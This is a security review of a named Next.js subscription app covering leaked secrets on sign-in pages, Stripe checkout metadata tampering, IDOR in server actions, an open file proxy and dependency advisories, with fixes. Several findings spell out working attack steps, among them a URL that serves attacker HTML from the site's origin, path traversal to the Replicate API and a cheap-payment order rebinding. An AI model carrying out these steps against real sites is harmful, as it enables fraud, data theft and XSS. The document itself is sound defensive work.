# Security review: seedanceai.dev (2026-10-03)

Scope: Next.js 15.5.9 app (ShipAny template) on Cloudflare Workers via OpenNext 1.15.1, Turso/libsql via drizzle 0.44.5, better-auth 1.3.9, Stripe live.
Method: read-only code review, plus passive GETs of public pages and headers on https://seedanceai.dev. I did not run any exploit payloads. Secret values are not reproduced here.

Context: one account created 261 checkout sessions, an order's name field held a SQLite blind-injection probe, and about 40 signups came from disposable domains. Findings 1 and 2 below fit that pattern: someone reading every key on the sign-in page, and someone testing checkout metadata.

---

## CRITICAL

### C1. Every secret in the `config` table is served to anonymous visitors on /sign-in and /sign-up (confirmed live)

- Evidence: `src/app/[locale]/(auth)/sign-in/page.tsx:65` and `src/app/[locale]/(auth)/sign-up/page.tsx:61` call `getConfigs()` (`src/shared/models/config.ts:50`), which returns every row in the `config` table. They then pass the result as `configs` to the client components `SignIn`/`SignUp` (`src/shared/blocks/sign/sign-in.tsx:1`, `sign-up.tsx:1`, both `'use client'`). React serialises props into the RSC payload in the HTML.
- Verified with a passive GET of `https://seedanceai.dev/sign-in` (only key names and value lengths were checked). The page contains non-empty values for:
  - `stripe_secret_key`: 107 chars, starts `sk_live_`. **This is the live Stripe secret key.**
  - `kie_api_key` (32), `fal_api_key` (69), `replicate_api_token` (40)
  - `google_client_secret` (35)
  - `r2_access_key` (32), `r2_secret_key` (64): R2 write/delete access to bucket `seedanceai-dev`
  - `stripe_signing_secret`, `resend_api_key`, `openrouter_api_key` and `gemini_api_key` are present but empty in the DB.
- Impact: anyone can take full control of the live Stripe account: refunds, payouts metadata, customer PII, creating coupons, reading every customer. They can also spend the Kie, fal and Replicate balances, read, overwrite or delete every object in R2, and impersonate the Google OAuth client. This also explains why the site is being scanned.
- Fix (do now, in this order):
  1. **Rotate every exposed credential immediately:** the Stripe secret key (roll it in the Dashboard, and check recent API logs, refunds, payouts and webhook endpoints for anything you did not do), Kie, fal, Replicate, the Google OAuth client secret, and the R2 access key pair. Also review R2 for objects that were deleted or replaced.
  2. In both auth pages, replace `getConfigs()` with `getPublicConfigs()` (`src/shared/models/config.ts:110`, whitelist in `src/shared/services/settings.ts:927`).
  3. Move secrets out of the `config` table and into Worker secrets (`wrangler secret put`). `getAllConfigs()` already prefers env vars (`config.ts:94-103`).
  4. Add a regression test or CI grep that fails if `getConfigs`/`getAllConfigs` output reaches a `'use client'` component. The admin settings page (`src/app/[locale]/(admin)/admin/settings/[tab]/page.tsx:93`, `data: configs`) also sends every secret to the admin browser. Mask secret fields there and only write them back when changed.

### C2. Checkout metadata from the client can rebind a Stripe payment to a different, more expensive order

- Evidence: in `src/app/api/payment/checkout/route.ts:246-251`, `metadata: { app_name, order_no, user_id, ...(metadata || {}) }` spreads the client-supplied `metadata` after `order_no`/`user_id`, so the client can override both. `src/extensions/payment/stripe.ts:191-193` copies the result onto the Stripe session. The webhook (`src/app/api/payment/notify/[provider]/route.ts:56-70`) looks up the order by `session.metadata.order_no` and calls `handleCheckoutSuccess`. That function (`src/shared/services/payment.ts:125-272`) never checks that `session.id === order.paymentSessionId`, that the amount or currency match, or that `metadata.user_id === order.userId`.
- Attack: create (but don't pay) a checkout for `max_yearly` (31,200 credits, $999), giving order X. Then create a checkout for `plus_monthly` ($19.90) with `metadata: { order_no: X }` and pay it. The webhook marks X paid, grants 31,200 credits, and creates a subscription row with X's `creditsAmount`. Every $19.90 renewal then grants 31,200 credits (`handleSubscriptionRenewal` uses `subscription.creditsAmount`, `payment.ts:453`). For one-time purchases, paying the $9.90 starter pack can unlock a pending $29.90 creator order in the same way. The 261-checkout account fits someone probing this.
- Fix: drop client `metadata` entirely, or spread it first so server keys win (`{ ...clientMeta, app_name, order_no, user_id }`). In `handleCheckoutSuccess`, require `session.paymentResult.id === order.paymentSessionId` (Stripe checkout session id), `metadata.user_id === order.userId`, and `amount_total + amount_discount === order.amount` in the same currency. Audit existing PAID orders where `paymentAmount` is far below `amount`, or where `transactionId != paymentSessionId`.

---

## HIGH

### H1. Server actions trust the client-supplied `passby` object (IDOR on user data, subscriptions and API keys)

- Evidence: `src/shared/blocks/form/index.tsx:298` calls `submit.handler(formData, passby)` from a client component, so `passby` is attacker-controlled. Actions that take identity or ownership from it:
  - `src/app/[locale]/(landing)/settings/profile/page.tsx:42-60`: `updateUser(passby.user.id, {name, image})`. **Any signed-in user can rename any user or set their avatar URL.**
  - `src/app/[locale]/(landing)/settings/billing/cancel/page.tsx:75-107`: the ownership check compares `passby.subscription.userId` with `passby.user.id`, both from the client. **Any signed-in user can cancel any Stripe subscription id on the account** (`cancelSubscription`) and overwrite any local subscription row by `subscriptionNo`.
  - `src/app/[locale]/(landing)/settings/apikeys/[id]/edit/page.tsx:57-82` and `.../delete/page.tsx:70-94`: the same pattern lets a user edit or delete any API key by id.
  - Admin actions have no permission re-check inside the action: `admin/users/[id]/grant-credits/page.tsx:85-107` (grants credits to `passby.user`), `admin/users/[id]/edit-roles/page.tsx:86-104` (assign any role to any user, including super_admin), `admin/users/[id]/edit/page.tsx:69`, `admin/roles/[id]/edit*/page.tsx`, `admin/settings/[tab]/page.tsx:45-58` (checks only "signed in", then `saveConfigs` overwrites **all** config such as Stripe keys and payment provider). Next 15 action IDs are not guessable, so exploiting the admin actions needs a leaked ID. That makes them defence-in-depth (high impact, lower likelihood). The user-settings actions are directly exploitable because every user receives those action IDs.
- Fix: in every action, get the user with `getUserInfo()` on the server and re-load the target record by id from the DB. Never read identity or ownership from `passby`. Each admin action should call `requirePermission(...)` itself.

### H2. `/api/proxy/file` is an unauthenticated open proxy that reflects content type (XSS on seedanceai.dev)

- Evidence: `src/app/api/proxy/file/route.ts:4-26` fetches any `url` with no auth and no allowlist, and returns the body with the upstream `Content-Type`.
- Impact: `https://seedanceai.dev/api/proxy/file?url=https://attacker/x.html` serves attacker HTML and JS from your origin, which is full same-origin XSS (calls authenticated APIs and server actions as the victim). The endpoint also works as a free bandwidth proxy and SSRF from Cloudflare egress.
- Fix: require a session, and only allow hosts you generate (`r2.seedanceai.dev`, Kie/fal output CDNs). Force `Content-Disposition: attachment` and a fixed safe `Content-Type` (or allow only video/*, image/* other than svg, and audio/*). Add `Content-Security-Policy: sandbox`.

### H3. AI generation: arbitrary provider models at flat prices, and a check-then-charge race

- Evidence (`src/app/api/ai/generate/route.ts`):
  - Lines 335-353: for non-"product" models, `provider` and `model` come from the client and go straight to `aiProvider.generate`. Kie `generateImage` (`src/extensions/ai/kie.ts:148`) posts any `model` to `jobs/createTask`, and fal builds `${baseUrl}/${model}` (`fal.ts:71`). Cost is a flat 2-10 credits (lines 190-221), so any Kie or fal market model can be run for 2 credits, including expensive video models submitted as `mediaType: image`.
  - Lines 228-231 check the balance, then the provider job is submitted (lines 238-354), and credits are only consumed afterwards in `createAITask` (`src/shared/models/ai_task.ts:16-47`). N parallel requests all pass the check and all submit paid provider jobs. Consumption then fails for the excess requests, but the provider has already charged you.
  - `/api/video/ai` POST (`src/app/api/video/ai/route.ts:131-143, 361-373`) does the same: it checks the balance, runs Replicate for up to 5 min, then calls `consumeCredits`. A consumption failure is caught and ignored (`catch` only logs), so the user gets the video for free.
- Combined with 5 free signup credits and no email verification (see H5), this is the main way to farm provider spend.
- Fix: allowlist `(provider, model, scene)` server-side with prices from config, and reject anything else. Reserve or consume credits atomically **before** submitting, then refund on submit failure or on FAILED (refund logic already exists in `updateAITaskById`). In `/api/video/ai`, consume before the Replicate call and fail closed.

### H4. `/api/video/ai` GET: unauthenticated proxy to the Replicate API with the server token, including path traversal

- Evidence: `src/app/api/video/ai/route.ts:416-449`. There is no auth, and ``fetch(`https://api.replicate.com/v1/predictions/${predictionId}`)`` uses the server Bearer token. `?id=../predictions` or `?id=../account` is normalised by the URL parser to `/v1/predictions` and `/v1/account`, which lists every prediction (all users' prompts, inputs and outputs) and account details.
- Fix: require a session, check that `predictionId` matches `^[a-z0-9]+$`, and check that it belongs to one of the caller's videos. Or delete the handler (the POST already polls).

### H5. Sign-up abuse: no email verification, credits granted on account creation, no working rate limit or CAPTCHA

- Evidence:
  - `src/core/auth/config.ts:81-82`: verification is on only if `email_verification_enabled === 'true'` **and** `resend_api_key` is set. The live public config shows both empty in the DB, so verification is off unless overridden by env (**needs confirmation** of `EMAIL_VERIFICATION_ENABLED`/`RESEND_API_KEY` Worker vars). The `wren.test` signups (an undeliverable TLD) suggest it is off.
  - `src/core/auth/config.ts:138-146`: `grantCreditsForNewUser` runs in `user.create.after`, at row creation and before any verification. The live config is `initial_credits_enabled=true`, `initial_credits_amount=5`, valid 30 days.
  - There is no disposable-domain blocklist and no CAPTCHA or Turnstile anywhere in `src`.
  - Rate limiting: better-auth 1.3.9's default limiter uses in-memory storage, which does not persist across Workers isolates. The only custom limiter (`src/app/api/auth/[...all]/route.ts:10`) is explicitly disabled on Workers and only covers get-session. Checkout and generate have no limits, hence the 261 sessions.
- Fix: enable verification (set the Resend key) and grant signup credits only after `emailVerified` becomes true (for example in an `emailVerification.onEmailVerification` hook, or lazily on the first generate call). Add Cloudflare Turnstile to sign-up. Block disposable domains (for example the `disposable-email-domains` list) in `user.create.before`. Configure better-auth `rateLimit` with `storage: 'database'` or a KV/Durable Object store. Add Cloudflare WAF rate-limit rules for `/api/auth/sign-up/*`, `/api/auth/sign-in/*`, `/api/payment/checkout`, `/api/checkout` and `/api/ai/generate`, and cap open checkouts per user.

### H6. Unauthenticated image upload to `r2.seedanceai.dev` (SVG allowed, no size limit)

- Evidence: `src/app/api/storage/upload-image/route.ts:20-91` has no session check, accepts any client-declared `image/*` including `image/svg+xml` (line 12), uses `disposition: 'inline'`, and has no size cap. `uploadImageToR2` (`src/shared/services/video.ts:318-334`) also allows SVG and takes the extension from the client filename.
- Impact: anyone can host files on your same-site subdomain. That covers stored XSS via SVG on `r2.seedanceai.dev`, phishing or malware hosting under your domain, storage cost, and same-site requests that bypass SameSite=Lax.
- Fix: require a session, sniff magic bytes server-side, allow only jpeg/png/webp, reject SVG, cap the size (for example 10 MB), use a server-chosen extension, and serve R2 with `Content-Disposition: attachment` for anything that isn't a raster image. Ideally use a separate registrable domain for user content.

### H7. Vulnerable dependencies with reachable paths

- `@opennextjs/cloudflare` 1.15.1 (<1.17.1): GHSA-c7mq-gh6q-6q7c, SSRF via `/cdn-cgi/` path normalisation. This is your runtime.
- `better-auth` 1.3.9: GHSA-g38m-r43w-p2q7 (<1.6.11), account takeover via OAuth auto-link to an unverified pre-registered email. This is reachable because email/password sign-up has no verification and Google sign-in is enabled. Also GHSA-p6v2-xcpg-h6xw (rate limiter bypass via IPv6) and GHSA-569q-mpph-wgww (basePath DoS).
- `next` 15.5.9: several middleware or proxy bypass advisories (GHSA-26hh-7cqf-hhc6, GHSA-492v-c6pp-mqqv, GHSA-267c-6grr-h53f) and RSC/server-action DoS advisories (GHSA-h25m-26qc-wcjf, GHSA-q4gf-8mx6-v5v3, GHSA-m99w-x7hq-7vfj). Impact is limited because middleware only checks for a session cookie and admin pages re-check RBAC, but DoS is reachable. The Image-Optimizer RCE (GHSA-2xp9-vwfh-vxw4) is not reachable (`images.unoptimized: true`, Workers), and neither is the Windows RCE.
- Not reachable or low: kysely (better-auth uses the drizzle adapter), drizzle identifier escaping (no user-controlled identifiers), swiper prototype pollution (client-only), the fast-xml-parser/minimatch/brace-expansion chain (build tooling), and axios (PayPal SDK, PayPal disabled).
- Fix: upgrade `next` to ≥15.5.24, `better-auth` to the latest 1.6.x (≥1.6.22), `@opennextjs/cloudflare` to ≥1.17.1, and `drizzle-orm` to ≥0.45.2. Then re-run `pnpm audit --prod`. Totals today: 7 critical, 84 high, 95 moderate, 23 low.

---

## MEDIUM

### M1. `/api/email/send-email` is unauthenticated with arbitrary recipients and subject

- `src/app/api/email/send-email/route.ts:5-15`: anyone can send email from your Resend domain to any list. `resend_api_key` is empty in the DB, so it probably fails today (**needs confirmation**: check the `RESEND_API_KEY` env var). It becomes a spam relay the moment the key is set. Fix: delete the route, or require an admin permission.

### M2. `/api/video/ai` POST leaks other users' videos by id

- `src/app/api/video/ai/route.ts:149-185`: for a `videoId` in `generating` or `completed` state, the handler returns `videoUrl` and `replicatePredictionId` **before** the ownership check at line 179. It also calls `updateVideoRecord(videoId, Generating)` when the id does not exist. Fix: check ownership first.

### M3. `/api/chat/messages` IDOR

- `src/app/api/chat/messages/route.ts:23-35` returns any chat's messages by `chatId` without checking `chat.userId`. The other chat routes do check. Chat ids are random and `openrouter_api_key` is empty, so the practical risk today is low. Fix: load the chat and compare `userId`. Also note that `/api/chat` lets users pick any OpenRouter `model` with no credit charge, which matters if you ever set the key.

### M4. Pack-upgrade and subscription-credit quotes are not consumed

- `src/shared/services/pack-upgrade.ts:34-125`: the upgrade tier only counts PAID orders and is never reserved. A buyer of the $9.90 starter pack can open several concurrent "upgrade to creator" checkouts at $20 each (450 credits each, a better rate than list), or several subscription checkouts each with the $9.90 first-payment coupon (`stripe.ts:125-134`). Fix: record the credit or upgrade as consumed when the checkout is created, or reject new upgrade checkouts while one is open, and re-validate in the webhook.

### M5. Refund on task failure is check-then-act (**needs confirmation**)

- `src/shared/models/ai_task.ts:58-92` reads the consume record's status, then increments grants and marks it DELETED. Two concurrent `/api/ai/query` calls that both see FAILED could double-refund if Turso does not serialise the two interactive transactions. SQLite normally raises BUSY on the second writer. Fix: make it atomic with `UPDATE credit SET status='deleted' WHERE id=? AND status='active' RETURNING`, and refund only if a row was returned.

### M6. No Content-Security-Policy

- `next.config.mjs:63-85` sets nosniff, DENY, Referrer-Policy, Permissions-Policy and HSTS (all verified live), but there is no CSP. Given H2 and markdown with `html: true` (L3), add at least `object-src 'none'; base-uri 'self'; frame-ancestors 'none'`, then a script-src policy (nonce-based or an allowlist for GA, Clarity and similar). Consider `includeSubDomains; preload` on HSTS.

---

## LOW

- **L1. Email-verification oracle:** `src/app/api/user/is-email-verified/route.ts` is unauthenticated and reveals whether an email has a verified account. Rate-limit it, or return the result only for the email in a pending-verification cookie.
- **L2. Template AUTH_SECRET in git history:** commit `a6bcd46` ("init", reachable from `origin/one/main`) has a non-empty `AUTH_SECRET` in `.env.example`. It is probably the template default, but **needs confirmation** that production `AUTH_SECRET_SECRET` is a different value. If it is the same, rotate it (doing so invalidates all sessions). The current `.env.example` value is empty. The tracked `.dev.vars` contains only `NEXTJS_ENV`.
- **L3. Admin-authored markdown renders raw HTML:** `src/shared/blocks/common/markdown-content.tsx:12-16` (`html: true`) and `markdown-preview.tsx` show posts as HTML. Anyone with posts:write can store XSS. Set `html: false` or sanitise with DOMPurify.
- **L4. Search-guide `renderInline`:** `src/themes/default/blocks/search-guide.tsx:54-68` accepts any href scheme from `[text](href)`. Content comes only from repo JSON, and React 19 blocks `javascript:` URLs, so nothing is exploitable today. Add a `^(\/|https:)` check if this ever renders non-repo content.
- **L5. `stripe_signing_secret` is empty in the DB:** `stripe.ts:256-258` rejects every webhook if it is missing everywhere. It is presumably set as a Worker env var, since paid orders are processing (**needs confirmation**). Note that rotating the leaked secret key (C1) does not change the webhook secret. Roll the webhook secret too, because the endpoint list may have been read.
- **L6. `getClientIp`:** `src/shared/lib/ip.ts:1` is a `'use server'` module, so it is exposed as a callable server action. It is harmless (it returns the caller's IP), but remove the directive. `rate-limit.ts:25-36` prefers the spoofable `x-forwarded-for` over `cf-connecting-ip`.
- **L7. Upstream detail echo:** `src/app/api/video/ai/route.ts:280-288` echoes upstream Replicate error bodies to the client.

---

## Checked and fine

- **SQL injection:** all queries use drizzle builders with bound parameters. The only `sql\`` templates are `src/config/db/schema.sqlite.ts:8` (constant) and `src/shared/models/ai_task.ts:78` (column + bound number). `like()` in `src/shared/models/post.tsx:105-106,134-135` is parameterised (wildcards are not escaped, which is harmless). The injection probe in the order name field was stored as an inert string. No `sql.raw` or `.execute()` with string building exists.
- **Stripe webhook:** `stripe.ts:247-264` uses `webhooks.constructEvent` with the raw body and signature (300 s tolerance), and unknown event types throw. Idempotency comes from the order status lock (`order.ts:287-303`), credit dedupe per `orderNo` inside the transaction (`order.ts:264-282`), and renewal dedupe by `transactionId` (`notify/route.ts:99-110`).
- **Payment callback** (`src/app/api/payment/callback/route.ts`): requires a session, checks `order.userId === user.id`, and pulls the session from Stripe using the **stored** `order.paymentSessionId`. A user cannot mark someone else's order paid, or their own order without Stripe saying `paid`. The redirect target is server-set (`order.callbackUrl`).
- **Checkout pricing:** amount, currency, credits and valid days come from server-side locale JSON (en and zh pricing are identical). Client `currency` only picks from the configured list, `allow_promotion_codes` is false live, and `success_url`/`cancel_url` are built from `configs.app_url`.
- **Credit consumption** (`credit.ts:145-302`) runs balance check and decrement inside one transaction, which SQLite serialises. There is no user-facing endpoint that grants credits. The admin grant action has the permission gap noted in H1.
- **AuthZ OK:** `/api/ai/query` (owner check), `/api/video/status`, `/api/video/delete`, `/api/video/my-videos`, `/api/video/save`, `/api/chat`, `/api/chat/info`, `/api/chat/list`, `/api/chat/new`, `/api/feedback/add`, `/api/user/get-user-credits`, `/api/user/get-user-info` (returns only the session user), `/api/payment/upgrade-offer`. `/api/config/get-configs` returns only the `publicSettingNames` whitelist. Admin pages are gated by `requireAdminAccess` in `(admin)/layout.tsx:24` and by per-page `requirePermission`.
- **Seedance product path:** `normalizePublicAssetUrls` (`generate/route.ts:36-78`) only forwards URLs to third-party providers and never fetches them server-side. Its private-IP blocklist is incomplete (IPv6 forms, decimal IPs, DNS rebinding), but the server makes no fetch, so this is not SSRF against you.
- **Open redirects:** sign-in and sign-up server redirects go through `safeInternalPath`, and better-auth's origin check validates `callbackURL` against `trustedOrigins` (`[app_url]`). Payment success and cancel URLs are server-built.
- **JSON-LD:** `src/shared/components/seo/json-ld.tsx:6` escapes `<` as `<`, so `</script>` cannot break out. The other `dangerouslySetInnerHTML` uses (showcase, top-banner, analytics snippets, form tips) render repo or admin config, not user input.
- **Secrets in git:** no live keys in tracked files or history beyond L2. `.env*`, `wrangler.toml` and `.dev.vars` values are clean or ignored. `NEXT_PUBLIC_*` vars are app URL, name, theme and appearance only.
- **Admin bootstrap:** `scripts/assign-role.ts` is a local CLI that needs DB credentials. There are no default admin credentials. `initial_role_enabled` is empty live, so new users get no role.
- **Headers (live):** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`, `HSTS max-age=31536000`, `poweredByHeader: false`. The sign-in page is `Cache-Control: private, no-store`, so the leak in C1 is not cached at the edge, though it is still served on every request.

## Suggested order of work

1. Today: rotate the Stripe live key, Kie, fal, Replicate, Google OAuth secret and R2 keys, and roll the Stripe webhook secret. Ship the `getPublicConfigs` fix (C1).
2. Ship the metadata fix and the session/amount checks in `handleCheckoutSuccess` (C2). Audit PAID orders and subscriptions created since launch.
3. Fix the `passby` actions (H1). Delete or lock down `/api/proxy/file`, `/api/video/ai` GET, `/api/email/send-email` and the unauthenticated upload (H2, H4, M1, H6).
4. Add the model allowlist and credit reservation (H3), verification-gated credits plus Turnstile plus a disposable-domain block plus WAF rate limits (H5), and the dependency upgrades (H7).
